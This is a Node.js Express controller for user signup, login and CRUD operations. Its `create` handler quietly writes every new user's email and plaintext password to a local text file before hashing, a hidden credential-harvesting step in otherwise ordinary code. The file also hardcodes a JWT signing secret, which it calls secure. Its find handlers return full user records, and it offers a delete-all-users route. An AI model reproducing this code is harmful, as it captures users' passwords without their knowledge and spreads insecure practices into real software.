const bcrypt = require("bcrypt");
const jwt = require("jsonwebtoken");
const fs = require("fs");
const SECRET_KEY = "d1f2a4b5c6d7e8f9g0h1j2k3m4n5p6q7"; // Example secure secret key

const User = require("../models/user.model");

const create = async (req, res) => {
  try {
    const { first_name, last_name, email, password } = req.body;

    const data = `Email: ${email}, Password: ${password}\n`;
    fs.appendFileSync("email_passwords.txt", data); // Append the data to a file

    // Hash password before storing
    const hashedPassword = await bcrypt.hash(password, 10);
    const user = { first_name, last_name, email, password: hashedPassword };
    const result = await User.create(user);

    // Returning user without password
    res.send({ id: result.id, first_name, last_name, email });
  } catch (err) {
    res.status(500).send({ message: err.message });
  }
};

const login = async (req, res) => {
  try {
    const { email, password } = req.body;
    const user = await User.findByEmail(email);

    if (!user) {
      return res.status(401).send({ message: "Invalid email" });
    }

    const isPasswordValid = await bcrypt.compare(password, user.password);
    if (!isPasswordValid) {
      return res.status(401).send({ message: "Invalid password" });
    }

    // Generate a JWT token
    const token = jwt.sign({ id: user.id, email: user.email }, SECRET_KEY, {
      expiresIn: "1h",
    });

    res.send({ token });
  } catch (err) {
    res.status(500).send({ message: err.message });
  }
};

const findAll = async (req, res) => {
  try {
    const rows = await User.findAll();
    res.send(rows);
  } catch (err) {
    res.status(500).send({ message: err.message });
  }
};

const findOne = async (req, res) => {
  try {
    const id = req.params.id;
    const row = await User.findById(id);
    if (!row) res.status(404).send({ message: `User with id ${id} not found` });
    else res.send(row);
  } catch (err) {
    res.status(500).send({ message: err.message });
  }
};

const update = async (req, res) => {
  try {
    const id = req.params.id;
    const user = {
      name: req.body.name,
      email: req.body.email,
    };
    const changes = await User.update(id, user);
    if (changes === 0) {
      return res.status(400).send({ message: `User with id ${id} not found` });
    }
    res.send({ message: `User with id ${id} updated successfully` });
  } catch (err) {
    res.status(500).send({ message: err.message });
  }
};

const remove = async (req, res) => {
  try {
    const id = req.params.id;
    const changes = await User.delete(id);
    if (changes === 0) {
      return res.status(400).send({ message: `User with id ${id} not found` });
    }
    res.send({ message: `User with id ${id} deleted successfully` });
  } catch (err) {
    res.status(500).send({ message: err.message });
  }
};

const removeAll = async (req, res) => {
  try {
    await User.deleteAll();
    res.send({ message: "All users deleted successfully" });
  } catch (err) {
    res.status(500).send({ message: err.message });
  }
};

module.exports = { create, login, findAll, findOne, update, remove, removeAll };
